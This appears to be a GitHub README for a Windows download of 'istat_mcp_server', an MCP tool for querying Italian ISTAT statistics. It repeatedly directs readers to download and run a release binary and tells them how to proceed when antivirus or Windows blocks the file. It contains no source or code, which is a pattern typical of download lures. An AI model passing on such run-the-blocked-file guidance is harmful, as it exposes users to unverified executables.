# 📊 istat_mcp_server - Get Italian Statistics Fast

[![Download](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/benedictine-melilot681/istat_mcp_server/releases)

## 🚀 What this does

`istat_mcp_server` is an MCP server that lets you query Italian statistics from ISTAT through the SDMX API. It works with MCP clients and helps you get data in a simple, direct way.

Use it to look up data such as:
- population
- prices
- jobs
- businesses
- regions and provinces
- time series from ISTAT datasets

## 💻 What you need

Before you install the app, make sure you have:

- A Windows PC
- Internet access
- Permission to run downloaded files
- An MCP client that can connect to a local server

If you plan to use it with Claude or another MCP tool, keep that app ready before setup.

## 📥 Download the app

Visit the release page to download the Windows build:

[Go to Releases](https://github.com/benedictine-melilot681/istat_mcp_server/releases)

On that page, look for the latest release and download the file made for Windows.

## 🛠️ Install on Windows

Follow these steps:

1. Open the release page.
2. Find the latest version.
3. Download the Windows file from the release assets.
4. If Windows asks for confirmation, choose to keep or run the file.
5. Place the file in a folder you can find again, such as `Downloads` or `Desktop`.

If the release comes as a ZIP file:
1. Right-click the ZIP file.
2. Choose **Extract All**.
3. Open the extracted folder.
4. Find the app file inside.

## ▶️ Run the server

After you download the file:

1. Double-click the file to start it.
2. Wait for the server to start.
3. Keep the window open while you use your MCP client.

If the app opens in a console window, that is normal. The server needs to stay running so your MCP client can use it.

## 🔗 Connect it to your MCP client

To use `istat_mcp_server`, add it to your MCP client as a local server.

Typical setup steps:

1. Open your MCP client settings.
2. Find the area for local servers or tools.
3. Add a new server entry for `istat_mcp_server`.
4. Point it to the downloaded Windows file.
5. Save the settings.
6. Restart the client if needed.

If your client asks for a command or path, use the location of the downloaded file.

## 📚 What you can query

This server is built for ISTAT data through the SDMX API. That means you can ask for structured statistics data, such as:

- national and local population data
- labor market data
- inflation and price indexes
- business and industry data
- demographic trends
- time-based statistical series

You can use it to pull data from ISTAT tables and datasets without going through the full website each time.

## 🧭 How it fits into your workflow

A common setup looks like this:

1. Start the MCP server on Windows.
2. Open your MCP client.
3. Ask for an ISTAT data query.
4. Let the client talk to the server.
5. Review the results in your chat or tool window.

This setup works well when you want current or structured Italian statistics in a plain text workflow.

## ⚙️ Basic setup tips

If the server does not start:

- Make sure you downloaded the latest release
- Check that the file finished downloading
- Try running it from a folder with a short path, such as `C:\Tools`
- Make sure your security software did not block the file
- Confirm that your internet connection works

If your MCP client does not see the server:

- Check the file path
- Restart the client
- Make sure the server window is still open
- Verify that the server entry points to the correct file

## 🔍 Example use cases

You may find this useful for:

- checking Italian population data for a region
- comparing employment data across years
- reviewing price trends in Italy
- pulling statistics for reports
- looking up public data from ISTAT in a chat-based workflow
- connecting data tools to a local MCP server

## 🧩 File and folder tips

To keep setup simple:

- Save the download in one folder
- Do not rename files unless you need to
- Keep the release file and any extracted files together
- Use a folder with a path you can type easily

A simple folder like `C:\istat_mcp_server` works well.

## 📎 Release page

Use this page to get the latest Windows build:

[https://github.com/benedictine-melilot681/istat_mcp_server/releases](https://github.com/benedictine-melilot681/istat_mcp_server/releases)

## 🧠 About the project

This project uses:
- Python
- SDMX
- Open data
- MCP
- ISTAT datasets

It is made for users who want a local bridge between an MCP client and Italian statistics data.

## 🧰 Common problems

### The file does not open

- Download it again from the release page
- Check that the download completed
- Try a different browser
- Move the file to a simpler folder

### Windows blocks the file

- Right-click the file
- Open its properties
- Check if Windows marked it as blocked
- Try running it again after confirmation

### The client says the server is offline

- Keep the server window open
- Check the file path in the client settings
- Restart both the server and the client
- Make sure no other app is using the same port

### No data comes back

- Try a different query
- Check your internet access
- Make sure the ISTAT dataset you want is available
- Restart the server and try again

## 🗂️ Topics

ai, claude, data, istat, italy, mcp, mcp-server, model-context-protocol, open-data, python, sdmx, statistics

## 📦 Download and setup

1. Visit the release page: [https://github.com/benedictine-melilot681/istat_mcp_server/releases](https://github.com/benedictine-melilot681/istat_mcp_server/releases)
2. Download the Windows file from the latest release
3. Save it in a folder you can find again
4. Run the file
5. Keep it open while your MCP client uses it